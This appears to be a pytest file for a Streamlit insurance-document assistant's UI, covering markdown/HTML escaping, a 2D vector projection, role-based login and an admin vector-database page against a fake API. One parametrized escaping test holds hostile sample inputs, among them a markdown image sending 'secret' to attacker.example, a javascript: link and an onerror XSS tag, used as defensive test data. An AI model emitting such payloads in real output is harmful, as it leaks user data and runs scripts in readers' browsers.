"""Tests for the web UI: safe rendering, the 2D map maths, and the whole app driven by
Streamlit's AppTest against a FAKE API (the UI only ever talks to the API)."""

from pathlib import Path
from typing import Any

import numpy as np
import pytest
import streamlit as st
from streamlit.testing.v1 import AppTest

from insureassist.config import settings
from insureassist.ingestion import embedder as embedder_module
from insureassist.ingestion.embedder import HashEmbedder
from insureassist.ingestion.pipeline import ingest_file
from insureassist.ingestion.vector_store import VectorStore
from insureassist.ui import api_client
from insureassist.ui.api_client import ApiClientError
from insureassist.ui.render import plain
from insureassist.ui.vector_db_view import project_2d

APP = Path("src/insureassist/ui/app.py")

# --- safe rendering -----------------------------------------------------------------------


@pytest.mark.parametrize(
    "dangerous",
    [
        "![x](https://attacker.example/?d=secret)",  # image that would leak data
        "[click](javascript:alert(1))",  # link
        "<img src=x onerror=alert(1)>",  # HTML
        "**bold** _it_ # heading `code` $x^2$",  # formatting and math
    ],
)
def test_plain_escapes_every_markdown_and_html_character(dangerous: str) -> None:
    escaped = plain(dangerous)
    for char in "![]()<>*_#`$":
        # every special character is preceded by a backslash
        assert char not in escaped.replace("\\" + char, "")


def test_plain_keeps_normal_text_readable() -> None:
    assert plain("The deductible is 500 per claim") == "The deductible is 500 per claim"


def test_project_2d_places_the_question_consistently() -> None:
    rng = np.random.default_rng(0)
    vectors = rng.normal(size=(7, 384)).astype(np.float32)

    projection = project_2d(vectors, question=vectors[3])

    assert projection.points.shape == (7, 2)
    assert 0.0 < projection.kept_share <= 1.0
    np.testing.assert_allclose(projection.question, projection.points[3], atol=1e-6)


# --- the whole app against a fake API -------------------------------------------------

USERS = {"viewer@example.com": "viewer", "admin@example.com": "admin"}
DOCS = {
    "viewer": [{"id": "doc_a", "title": "Personal Auto Policy", "page_count": 4}],
    "admin": [
        {"id": "doc_a", "title": "Personal Auto Policy", "page_count": 4},
        {"id": "doc_b", "title": "Auto Policy Amendment No. 1", "page_count": 1},
    ],
}
ANSWER = {
    "query_id": "q-1",
    "status": "answered",
    "answer": "The collision deductible is $500 per claim [E1].",
    "citations": [
        {
            "ref": "E1",
            "document_id": "doc_a",
            "document_title": "Personal Auto Policy",
            "page_number": 3,
            "chunk_id": "doc_a-p3-c0",
            "snippet": "Collision $500",
        }
    ],
    "disclaimer": "AI-generated.",
    "model": "fake",
    "latency_ms": {"retrieval": 5, "generation": 10},
}


class FakeApi:
    """Behaves like the real API for the UI: same methods, same errors."""

    feedback_sent: list[tuple[str, str]] = []
    expire_on_ask = False

    def __init__(self, token: str | None = None, base_url: str | None = None) -> None:
        self.token = token

    def login(self, email: str, password: str) -> str:
        if email not in USERS or password != "right password":
            raise ApiClientError(401, "invalid_credentials", "Wrong e-mail or password.")
        self.token = USERS[email]  # the "token" is just the role in this fake
        return self.token

    def me(self) -> dict[str, Any]:
        assert self.token is not None
        return {"display_name": f"Demo {self.token}", "role": self.token}

    def documents(self) -> list[dict[str, Any]]:
        assert self.token is not None
        return DOCS[self.token]

    def ask(self, question: str, top_k: int) -> dict[str, Any]:
        if FakeApi.expire_on_ask:
            raise ApiClientError(401, "token_invalid", "Your session has expired.")
        return ANSWER

    def feedback(self, query_id: str, rating: str) -> dict[str, Any]:
        FakeApi.feedback_sent.append((query_id, rating))
        return {}


@pytest.fixture
def app(monkeypatch: pytest.MonkeyPatch) -> AppTest:
    FakeApi.feedback_sent = []
    FakeApi.expire_on_ask = False
    monkeypatch.setattr(api_client, "ApiClient", FakeApi)
    st.cache_resource.clear()
    return AppTest.from_file(str(APP.resolve()), default_timeout=60)


def _sign_in(app: AppTest, email: str, password: str = "right password") -> AppTest:
    app.run()
    app.text_input[0].set_value(email)
    app.text_input[1].set_value(password)
    return app.button[0].click().run()


def test_login_screen_first_and_wrong_password(app: AppTest) -> None:
    app.run()
    assert app.title[0].value == "Sign in to InsureAssist"
    assert not app.chat_input  # nothing else is shown before signing in

    _sign_in(app, "viewer@example.com", "wrong password")
    assert "Wrong e-mail or password." in [e.value for e in app.error]


def test_viewer_sees_only_their_documents_and_no_admin_page(app: AppTest) -> None:
    _sign_in(app, "viewer@example.com")

    assert not app.exception
    assert app.title[0].value == "Ask about your insurance documents"
    sidebar = " ".join(t.value for t in app.sidebar.text)
    assert "Personal Auto Policy" in sidebar and "Amendment" not in sidebar
    assert not app.sidebar.radio  # viewers get no "Vector DB" page choice


def test_ask_shows_answer_sources_and_takes_feedback(app: AppTest) -> None:
    _sign_in(app, "viewer@example.com")
    app.chat_input[0].set_value("What is the collision deductible?").run()

    text = " ".join(m.value for m in app.markdown)
    assert "Answered" in text
    assert "Personal Auto Policy, page 3" in text

    next(b for b in app.button if b.label == "Helpful").click().run()
    assert FakeApi.feedback_sent == [("q-1", "up")]
    assert any("Thanks for your feedback" in c.value for c in app.caption)


def test_expired_session_returns_to_login(app: AppTest) -> None:
    _sign_in(app, "viewer@example.com")
    FakeApi.expire_on_ask = True
    app.chat_input[0].set_value("anything?").run()

    assert app.title[0].value == "Sign in to InsureAssist"
    assert any("expired" in i.value for i in app.info)


def test_admin_gets_the_vector_db_page(
    app: AppTest, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake_embedder = HashEmbedder(dimension=256)
    store = VectorStore(tmp_path, fake_embedder.model_name, fake_embedder.dimension)
    ingest_file(Path("samples/pdfs/auto-policy.pdf"), store, fake_embedder)
    store.save()
    monkeypatch.setattr(settings, "index_dir", tmp_path)
    monkeypatch.setattr(embedder_module, "SentenceTransformerEmbedder", lambda: fake_embedder)

    _sign_in(app, "admin@example.com")
    app.sidebar.radio[0].set_value("Vector DB").run()

    assert not app.exception
    assert app.title[0].value == "Inside the vector database"
    rows = app.dataframe[1].value
    assert len(rows) == int(app.metric[1].value)
    app.text_input[0].set_value("collision deductible").run()
    assert app.dataframe[-1].value["similarity"].is_monotonic_decreasing
